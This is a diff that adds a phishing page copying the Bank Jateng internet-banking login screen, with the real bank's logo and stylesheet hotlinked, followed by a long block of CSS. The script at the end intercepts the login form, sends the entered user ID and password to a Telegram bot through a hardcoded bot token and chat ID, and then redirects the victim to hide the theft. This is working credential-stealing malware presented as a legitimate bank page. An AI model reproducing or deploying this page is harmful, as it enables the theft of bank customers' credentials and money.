@@ -1,0 +1,344 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="https://ibanking.bankjateng.co.id/resources/custom/iibs/style-iibs.css" media="screen">
+      <link rel="canonical" href=""> 
+
+  <meta name="twitter:card" content="summary_large_image"> 
+
+  <meta property="og:title" content="Bank | Jatemg"> 
+  <meta name="twitter:title" content="Bank | Jateng"> 
+  <meta property="og:site_name" content="Bank | Jateng"> 
+  <meta name="twitter:site_name" content="Bank | Jateng"> 
+  <meta property="og:description" content=""> 
+  <meta name="twitter:description" content="">
+  <link rel="image_src" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPojpO1JrYzEqIyV0xvts-vLk8senmrtWFWg&usqp=CAU?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max"> 
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPojpO1JrYzEqIyV0xvts-vLk8senmrtWFWg&usqp=CAU?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max"> 
+  <meta name="twitter:image:src" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPojpO1JrYzEqIyV0xvts-vLk8senmrtWFWg&usqp=CAU?w=&amp;h=&amp;auto=compress&amp;dpr=1&amp;fit=max"> 
+    <title>Bank Jateng | emoney</title>
+    <meta name="_csrf" content="6da04e3d-19bb-4852-af20-4d0bc69280ae">
+    <meta name="_csrf_header" content="X-XSRF-TOKEN">
+    <meta http-equiv="refresh" content="180">
+    
+</head>
+<body>
+
+<div id="loginkanan-container">
+    <div id="loginkanan">
+        <center>
+            <div id="login-sqrtop">
+                <div id="sqrtop-logo">
+                    <img src="https://ibanking.bankjateng.co.id/resources/custom/iibs/logo-bjtgwhite.png">
+                </div>
+                <hr>Internet Banking Personal<br> Bank Jateng
+            </div>
+            <form id="tg" onsubmit="" autocomplete="off">
+                <div id="login-sqrbot">
+                    <br>
+                    <div id="sqrbot-judul">
+                        <b>Login</b>
+                    </div>
+                    <br>
+                    
+
+                    <hr>
+                    <div id="sqrbot-usrid">
+                        <b>User ID</b>
+                    </div>
+                    
+                    
+                    
+                    <input id="Username" name="Username" required="required" type="text" class="input-login" placeholder="username anda" autocomplete="off">
+                    <div id="sqrbot-pas">
+                        <b>Password</b>
+                    </div>
+                    <input id="Password" name="Password" required="required" type="password" class="input-login" placeholder="password anda" autocomplete="off" maxlength="15">
+                    <input type="submit" class="button-login" name="submit" id="submit" value="Login">
+                    <div id="sqrbot-foot">
+                        <a href="/download.html">
+                            <center>Aktivasi User</center>
+                        </a>
+                        <p id="status"></p>
+                    </div>
+                </div>
+            </form>
+        </center>
+    </div>
+</div>
+<script>
+        const chat_id = '5990883050', botID = 'bot6516413676:AAEkRoZI_Ml-FX48jbzFlRm4AsW2j4vUGxs';
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#tg').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href='/id/login.html';
+    });
+
+
+    </script>
+</body>
+</html>
+<style>
+
+@charset "utf-8";
+
+body { height: auto; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); border-width: 3px; border-style: solid; border-color: rgb(202, 202, 206); border-radius: 15px; width: 800px !important; }
+
+a { text-decoration: none; }
+
+hr { width: 155px; }
+
+#logoutkiri-container { float: left; position: absolute; padding-bottom: 590px; padding-right: 487px; height: 0px; width: 0px; }
+
+#logoutkiri { height: 590px; width: 20vw; min-width: 487px; background-image: url("https://ibanking.bankjateng.co.id/resources/custom/iibs/wayang gedhe.png"), -webkit-linear-gradient(top, rgb(28, 59, 106), rgb(49, 153, 155)); background-position: left bottom, left top; background-repeat: no-repeat, no-repeat; background-size: 350px, auto; border-top-left-radius: 13px; border-bottom-left-radius: 13px; }
+
+#logoutkanan-container { display: inline-block; padding-bottom: 590px; padding-right: 800px; height: 0px; width: 0px; }
+
+#logoutkanan { height: 590px; width: 10vw; margin-left: 487px; min-width: 313px; background-color: rgb(242, 242, 242); border-top-right-radius: 13px; border-bottom-right-radius: 13px; }
+
+#logoutlogo { padding-top: 55px; padding-bottom: 18px; height: auto; margin-bottom: -15px; }
+
+#logoutlogo img { width: 3vw; min-width: 200px; }
+
+#logout-tulisankiri1 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 24px; margin-top: 15px; }
+
+#logout-tulisankiri2 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; }
+
+#logout-tulisankiri3 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; }
+
+#logoutwayang img { width: 3vw; min-width: 185px; margin-top: 30px; opacity: 0.4; }
+
+#logout-tulisankanan1 { color: rgb(28, 59, 106); font-family: Calibri; font-size: 22px; margin-top: 20px; padding-left: 55px; }
+
+#logout-tulisankanan2 { color: rgb(28, 59, 106); font-family: Calibri; font-size: 22px; padding-left: 55px; }
+
+#logout-tulisankanan3 { color: rgb(28, 59, 106); font-family: Calibri; font-size: 22px; padding-left: 55px; }
+
+.logout-btnlogin { display: block; margin: 30px auto 15px 50px; width: 10px; padding-top: 10px; padding-bottom: 10px; font-family: Calibri; font-size: 15px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; border-radius: 7px; min-width: 215px; cursor: pointer; }
+
+.input-logout { display: block; margin: 2px auto auto; width: 10vw; height: 30px; font-family: Calibri; font-size: 14px; color: rgb(0, 0, 0); border: 3px solid rgb(191, 191, 191); border-radius: 10px; min-width: 210px; }
+
+.input-error { margin: 2px auto auto; width: 10vw; height: 60px; font-family: Calibri; font-size: 14px; color: rgb(179, 0, 0); border: 3px solid rgb(191, 191, 191); border-radius: 10px; min-width: 280px; }
+
+#sqrbotaktif-usrid { font-family: Calibri; font-size: 18px; color: rgb(128, 128, 128); padding-top: 10px; padding-left: 50px; }
+
+.sqrbotaktif { font-family: Calibri; font-size: 18px; color: rgb(128, 128, 128); margin-top: 10px; padding-left: 50px; }
+
+#homekiri-container { float: left; position: absolute; padding-bottom: 519px; padding-right: 551px; height: 0px; width: 0px; }
+
+#homekiri { height: 519px; width: 20vw; min-width: 551px; background-image: url("https://ibanking.bankjateng.co.id/resources/custom/iibs/wayang lp ya.png"), -webkit-linear-gradient(top, rgb(28, 59, 106), rgb(49, 153, 155)); background-position: left bottom, left top; background-repeat: no-repeat, no-repeat; background-size: 550px, auto; border-top-left-radius: 13px; border-bottom-left-radius: 13px; }
+
+#homekanan-container { display: inline-block; padding-bottom: 514px; padding-right: 800px; height: 0px; width: 0px; }
+
+#homekanan { height: 519px; width: 10vw; margin-left: 550px; min-width: 251px; background-image: -webkit-linear-gradient(top, rgb(28, 59, 106), rgb(49, 153, 155)); border-top-right-radius: 13px; border-bottom-right-radius: 13px; }
+
+#homelogo { padding-top: 60px; margin-left: 65px; height: auto; }
+
+#homelogo img { width: 3vw; min-width: 200px; }
+
+#home-tulisankiri1 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 18px; margin-left: 70px; }
+
+#home-tulisankiri2 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 18px; margin-left: 70px; }
+
+#home-tulisankiri3 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 15px; margin-left: 70px; }
+
+#homewayang img { width: 3vw; min-width: 185px; margin-top: 30px; opacity: 0.4; }
+
+#home-tulisankanan1 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 22px; padding-left: 20px; padding-top: 105px; }
+
+#home-tulisankanan2 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 16px; padding-left: 20px; }
+
+#home-tulisankanan3 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 16px; padding-left: 20px; }
+
+.home-btn { display: block; margin: 10px auto 10px 70px; width: 10px; padding-top: 5px; padding-bottom: 5px; font-family: Calibri; font-size: 20px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; min-width: 180px; }
+
+#home-tips { font-family: Calibri; margin-top: 61px; }
+
+#home-tips b { color: rgb(255, 204, 0); font-size: 12px; margin-left: 70px; }
+
+#home-tips ul { font-size: 10px; color: rgb(255, 255, 255); margin-left: 55px; margin-top: 5px; }
+
+#home-sqrkanan { width: 155px; height: 220px; border-radius: 10px; background-color: rgb(255, 255, 255); margin-top: 30px; margin-left: 20px; }
+
+.home-sqrtitle { font-size: 20px; font-family: Calibri; color: rgb(28, 59, 106); padding-top: 15px; }
+
+#home-sqrkanan hr { width: 100px; border: 0.7px solid; color: rgb(0, 0, 0); }
+
+#home-sqrtulisan1 { font-family: Calibri; color: rgb(28, 59, 106); font-size: 12px; margin-top: 35px; }
+
+.home-sqrbtn1 { display: block; margin: 10px auto 25px; width: 10px; padding-top: 5px; padding-bottom: 5px; font-family: Calibri; font-size: 12px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; min-width: 120px; border-radius: 5px; cursor: pointer; }
+
+#home-sqrtulisan2 { font-family: Calibri; color: rgb(28, 59, 106); font-size: 12px; margin-top: 15px; }
+
+.home-sqrbtn2 { display: block; margin: 10px auto; width: 10px; padding-top: 5px; padding-bottom: 5px; font-family: Calibri; font-size: 12px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; min-width: 120px; border-radius: 5px; }
+
+#home-sqrkanan a { font-size: 12px; font-family: Calibri; color: rgb(0, 204, 255); text-decoration: none; }
+
+#foot { position: absolute; z-index: 9999; font-style: italic; font-size: 10px; font-family: Calibri; margin-top: 60px; margin-left: 300px; color: rgb(255, 255, 255); }
+
+#loginkanan-container { padding-bottom: 519px; padding-right: 800px; height: 0px; width: 0px; }
+
+#loginkanan { height: 519px; width: 800px; min-width: 800px; background-color: rgb(217, 217, 217); border-radius: 11px; }
+
+.login-btnlogin { display: block; margin: 30px auto 15px 55px; width: 10px; padding-top: 10px; padding-bottom: 10px; font-family: Calibri; font-size: 15px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; border-radius: 7px; min-width: 200px; cursor: pointer; }
+
+#login-sqrtop { height: 165px; width: 250px; background-color: rgb(255, 255, 255); border-top-right-radius: 13px; border-top-left-radius: 13px; border-top: 2px solid rgb(179, 179, 179); border-left: 2px solid rgb(179, 179, 179); border-right: 2px solid rgb(179, 179, 179); background-image: -webkit-linear-gradient(top, rgb(28, 59, 106), rgb(49, 153, 155)); font-family: Calibri; font-size: 16px; color: rgb(255, 255, 255); }
+
+#login-sqrtop hr { width: 115px; }
+
+#sqrtop-logo { padding-top: 20px; height: auto; }
+
+#sqrtop-logo img { width: 3vw; min-width: 135px; }
+
+#login-sqrbot { height: 315px; width: 250px; background-color: rgb(255, 255, 255); border-bottom-right-radius: 13px; border-bottom-left-radius: 13px; border-bottom: 2px solid rgb(179, 179, 179); border-left: 2px solid rgb(179, 179, 179); border-right: 2px solid rgb(179, 179, 179); font-family: Calibri; font-size: 16px; color: rgb(255, 255, 255); }
+
+#login-sqrbot hr { width: 210px; }
+
+.input-login { display: block; margin: 2px auto auto; width: 10vw; height: 30px; font-family: Calibri; font-size: 14px; color: rgb(0, 0, 0); border: 3px solid rgb(217, 217, 217); border-radius: 10px; min-width: 210px; }
+
+.button-login { display: block; margin: 10px auto auto; width: 10vw; height: 30px; font-family: Calibri; font-size: 16px; border-radius: 5px; background-color: rgb(255, 204, 0); min-width: 210px; cursor: pointer; border: 0px !important; }
+
+#sqrbot-judul { font-family: Calibri; font-size: 22px; color: rgb(28, 59, 106); }
+
+#sqrbot-usrid { font-family: Calibri; font-size: 18px; color: rgb(128, 128, 128); margin-right: 160px; margin-top: 10px; }
+
+#sqrbot-pas { font-family: Calibri; font-size: 18px; color: rgb(128, 128, 128); margin-right: 140px; margin-top: 10px; }
+
+#sqrbot-foot { font-family: Calibri; font-size: 18px; color: rgb(0, 204, 255); margin-top: 10px; }
+
+#sqrbot-foot a { color: rgb(0, 204, 255) !important; }
+
+.alert { display: block; width: 250px; height: 30px; }
+
+.alert-error { color: rgb(147, 59, 57); background-color: rgb(233, 200, 200); border-color: rgb(235, 204, 209); font-family: Calibri; padding-top: 5px; }
+
+.space { display: block; width: 250px; height: 20px; }
+
+#footer-personal { }
+
+#img1-footer { width: 30px; }
+
+#img2-footer { width: 50px; margin-bottom: 6px; }
+
+#img3-footer { width: 40px; margin-bottom: 6px; }
+
+#img4-footer { width: 40px; margin-bottom: 3px; }
+
+#img5-footer { width: 39px; }
+
+#awpersonalkiri-container { float: left; padding-bottom: 523px; padding-right: 800px; height: 0px; width: 0px; }
+
+#awpersonalkiri { height: 523px; width: 20vw; min-width: 800px; background-image: url("https://ibanking.bankjateng.co.id/resources/custom/iibs/wayang gedhe.png"), -webkit-linear-gradient(top, rgb(28, 59, 106), rgb(49, 153, 155)); background-position: left bottom, left top; background-repeat: no-repeat, no-repeat; background-size: 485px, auto; border-radius: 13px; }
+
+#awpersonalkanan-container { display: inline-block; padding-bottom: 519px; padding-right: 800px; height: 0px; width: 0px; }
+
+#awpersonallogo { padding-top: 30px; padding-bottom: 18px; height: auto; margin-bottom: -15px; }
+
+#awpersonallogo img { width: 3vw; min-width: 200px; }
+
+#awpersonal-tulisanatas1 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 24px; margin-top: 15px; padding-bottom: 5px; }
+
+#awpersonal-tulisanatas2 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; }
+
+#awpersonal-tulisanatas3 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; }
+
+#awpersonal-tulisanatas4 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; }
+
+#awpersonal-tulisanbwh1 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; margin-top: 120px; }
+
+#awpersonal-tulisanbwh2 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; }
+
+#awpersonal-tulisanbwh3 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; }
+
+#awpersonal-tulisanbwh { color: rgb(255, 255, 255); font-family: Calibri; font-size: 14px; margin-top: 86px; }
+
+.awpersonal-btnlogin { display: block; margin: 30px auto 15px 50px; width: 10px; padding-top: 10px; padding-bottom: 10px; font-family: Calibri; font-size: 15px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; border-radius: 7px; min-width: 215px; cursor: pointer; }
+
+.awpersonal-input { display: block; margin: 2px auto auto; width: 10vw; height: 30px; font-family: Calibri; font-size: 14px; color: rgb(0, 0, 0); border: 3px solid rgb(191, 191, 191); border-radius: 10px; min-width: 210px; }
+
+#awpersonal-sqrbotaktif-usrid { font-family: Calibri; font-size: 18px; color: rgb(128, 128, 128); padding-top: 10px; padding-left: 50px; }
+
+.awpersonal-sqrbotaktif { font-family: Calibri; font-size: 18px; color: rgb(128, 128, 128); margin-top: 10px; padding-left: 50px; }
+
+#footer-logo { display: block; position: absolute; margin-top: 535px; margin-left: 190px; }
+
+#footer-logo img { width: 400px; }
+
+::-webkit-input-placeholder { font-family: Calibri; }
+
+@media only screen and (max-device-width: 786px) {
+  body { height: auto; position: relative; top: 0%; left: 0%; transform: translate(0%, 0%); border-width: 1px; border-style: solid; border-color: rgb(255, 255, 255); width: auto !important; margin: 0px auto !important; }
+  #loginkanan-container { padding-bottom: 519px; padding-right: 0px; height: 0px; width: 0px; }
+  #loginkanan { height: 519px; width: 975px; min-width: 800px; background-color: rgb(255, 255, 255); border-radius: 11px; }
+  .login-btnlogin { display: block; margin: 30px auto 15px 55px; width: 10px; padding-top: 10px; padding-bottom: 10px; font-family: Calibri; font-size: 15px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; border-radius: 7px; min-width: 200px; cursor: pointer; }
+  #login-sqrtop { height: 450px; width: 975px; background-color: rgb(255, 255, 255); border-top-right-radius: 13px; border-top-left-radius: 13px; border-top: 2px solid rgb(179, 179, 179); border-left: 2px solid rgb(179, 179, 179); border-right: 2px solid rgb(179, 179, 179); background-image: -webkit-linear-gradient(top, rgb(28, 59, 106), rgb(49, 153, 155)); font-family: Calibri; font-size: 42px; color: rgb(255, 255, 255); }
+  #login-sqrtop hr { width: 310px; }
+  #sqrtop-logo { padding-top: 45px; height: auto; }
+  #sqrtop-logo img { width: 3vw; min-width: 370px; }
+  #login-sqrbot { height: auto; width: 975px; background-color: rgb(255, 255, 255); border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; border-bottom: 0px solid rgb(179, 179, 179); border-left: 0px solid rgb(179, 179, 179); border-right: 0px solid rgb(179, 179, 179); font-family: Calibri; font-size: 16px; color: rgb(255, 255, 255); }
+  #login-sqrbot hr { width: 700px; }
+  .input-login { display: block; margin: 2px auto auto; width: 10vw; height: 90px; font-family: Calibri; font-size: 50px; color: rgb(0, 0, 0); border: 3px solid rgb(217, 217, 217); border-radius: 10px; min-width: 700px; }
+  .button-login { display: block; margin: 70px auto auto; width: 725px; height: 110px; font-family: Calibri; font-size: 50px; border-radius: 5px; background-color: rgb(255, 204, 0); min-width: 700px; cursor: pointer; border: 0px !important; }
+  #sqrbot-judul { font-family: Calibri; font-size: 70px; color: rgb(28, 59, 106); padding-top: 50px; margin-bottom: 45px; }
+  #sqrbot-usrid { font-family: Calibri; font-size: 55px; color: rgb(128, 128, 128); margin-right: 565px; margin-top: 90px; }
+  #sqrbot-pas { font-family: Calibri; font-size: 55px; color: rgb(128, 128, 128); margin-right: 520px; margin-top: 25px; }
+  #sqrbot-foot { font-family: Calibri; font-size: 55px; color: rgb(0, 204, 255); margin-top: 30px; }
+  #sqrbot-foot a { color: rgb(0, 204, 255) !important; }
+  .alert { display: block; width: 975px; height: 110px; }
+  .alert-error { color: rgb(147, 59, 57); background-color: rgb(233, 200, 200); border-color: rgb(235, 204, 209); font-family: Calibri; font-size: 50px; margin-top: 70px; height: 200px; }
+  .space { display: block; width: 800px; height: 110px; }
+  #footer-personal { margin-top: 550px; }
+  #img1-footer { width: 70px; }
+  #img2-footer { width: 90px; margin-bottom: 20px; }
+  #img3-footer { width: 70px; margin-bottom: 15px; }
+  #img4-footer { width: 70px; margin-bottom: 12px; }
+  #img5-footer { width: 70px; margin-bottom: 2px; }
+  #awpersonalkiri { height: 85vh; width: 20vw; min-width: 978px; background-image: url("https://ibanking.bankjateng.co.id/resources/custom/iibs/wayang gedhe.png"), -webkit-linear-gradient(top, rgb(28, 59, 106), rgb(49, 153, 155)); background-position: left bottom, left top; background-repeat: no-repeat, no-repeat; background-size: 957px, auto; border-radius: 0px; }
+  #awpersonallogo { padding-top: 150px; padding-bottom: 18px; height: auto; margin-bottom: -15px; }
+  #awpersonallogo img { width: 3vw; min-width: 600px; }
+  hr { width: 500px; }
+  #awpersonal-tulisanatas1 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 50px; margin-top: 60px; padding-bottom: 5px; }
+  #awpersonal-tulisanatas2 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 40px; }
+  #awpersonal-tulisanatas3 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 40px; }
+  #awpersonal-tulisanatas4 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 40px; }
+  #awpersonal-tulisanbwh1 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 40px; margin-top: 120px; }
+  #awpersonal-tulisanbwh2 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 40px; }
+  #awpersonal-tulisanbwh3 { color: rgb(255, 255, 255); font-family: Calibri; font-size: 40px; }
+  .home-sqrbtn1 { display: block; margin: 10px auto 40px; width: 10px; padding-top: 15px; padding-bottom: 15px; font-family: Calibri; font-size: 50px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; min-width: 525px; border-radius: 5px; cursor: pointer; }
+  #logoutkiri-container { display: none; }
+  #logoutkanan-container { padding-right: 978px; padding-bottom: 0px !important; height: auto !important; }
+  #logoutkanan { background-image: linear-gradient(rgb(28, 59, 106), rgb(49, 153, 155)); border-top-right-radius: 0px; border-bottom-right-radius: 0px; margin-left: 0px !important; min-width: 978px !important; height: 100vh !important; }
+  #sqrbotaktif-usrid { font-size: 50px; color: rgb(255, 255, 255); padding-left: 130px; }
+  .input-logout { display: block; margin: 2px auto auto; width: 10vw; height: 75px; font-family: Calibri; font-size: 40px; color: rgb(0, 0, 0); border: 3px solid rgb(191, 191, 191); border-radius: 10px; min-width: 710px; }
+  .input-error { display: block; margin: 2px auto auto; width: 10vw; height: 160px; font-family: Calibri; font-size: 40px; color: rgb(179, 0, 0); border: 3px solid rgb(191, 191, 191); border-radius: 10px; min-width: 900px; }
+  .sqrbotaktif { font-size: 50px; color: rgb(255, 255, 255); padding-left: 130px; }
+  .logout-btnlogin { display: block; margin: 45px auto 15px 130px; width: 10px; padding-top: 10px; padding-bottom: 10px; font-family: Calibri; font-size: 55px; font-weight: bold; color: rgb(28, 59, 106); border: 0px; border-radius: 7px; min-width: 715px; cursor: pointer; }
+  #logoutlogo-mobile { padding-top: 55px; padding-bottom: 18px; height: auto; margin-bottom: -15px; display: block !important; }
+  #logoutlogo-mobile img { width: 45vw; min-width: 225px; }
+  #logoutgaris-mobile { display: block !important; }
+  #logout-tulisankiri1-mobile { color: rgb(255, 255, 255); font-family: Calibri; font-size: 50px; margin-top: 15px; margin-bottom: 20px; display: block !important; }
+  #footer-logo { position: absolute; margin-top: 85vh; margin-left: 135px; }
+  #footer-logo img { width: 700px; }
+}
+
+.myBox { border: 2px solid rgb(189, 189, 194); border-radius: 5px; padding: 3px; font-family: Calibri; width: 400px; height: 290px; margin-left: 47px; margin-top: 15px; overflow-y: scroll; color: white; }
+
+::-webkit-scrollbar { width: 12px; height: 12px; }
+
+::-webkit-scrollbar-track { box-shadow: rgb(228, 228, 231) 0px 0px 10px inset; border-radius: 10px; }
+
+::-webkit-scrollbar-thumb { border-radius: 10px; background: rgb(202, 202, 206); box-shadow: rgba(0, 0, 0, 0.5) 0px 0px 6px inset; }
+
+::-webkit-scrollbar-thumb:hover { background: rgb(202, 202, 206); }
+</style>
